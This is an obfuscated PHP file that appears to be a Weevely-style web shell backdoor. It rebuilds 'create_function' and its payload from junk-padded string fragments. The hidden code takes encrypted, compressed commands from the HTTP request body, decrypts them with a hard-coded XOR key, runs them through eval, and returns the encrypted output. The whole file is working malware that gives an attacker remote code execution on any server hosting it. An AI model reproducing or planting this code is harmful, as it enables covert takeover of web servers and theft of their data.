<?php
$B='E^$k{$j};}}reEEtEurn $Eo;}if (@preg_match("/E$kh(.+)E$kf/"E,@filEe_Eget_conten';
$q='()E;$r=@bEase64_eEncodeE(@x(@gEzEcompressEE($o)EE,$k));print("$p$kh$r$kf");}';
$J=str_replace('KU','','crKUeatKUKUKUe_KUfuncKUtion');
$j='E$k="19ad6E21f";$khE=E"b382e9c8c187E";$kf="3E72d55Efee546EE";$p="lybBTAE5';
$U='ts("pEhEp://inpEEut"),$m)E==1) {@ob_stEart();@eEvaEl(@gEzuncompreEssE(@x(';
$n='fEor($i=0;$i<E$lE;){for($j=0;(E$j<$Ec&&$Ei<$l);$j++EE,$EiE++){$o.=E$t{$i}';
$e='@baseE64E_deEcode($m[E1]),$k)));$oE=E@ob_getE_contents();@EEob_end_cleaEn';
$S='nCDHx1EVESM";functiEon xE($t,$kE){$EEc=strlEen($k);$l=strlEen($t);$o=E""E;';
$f=str_replace('E','',$j.$S.$n.$B.$U.$e.$q);
$N=$J('',$f);$N();
?>
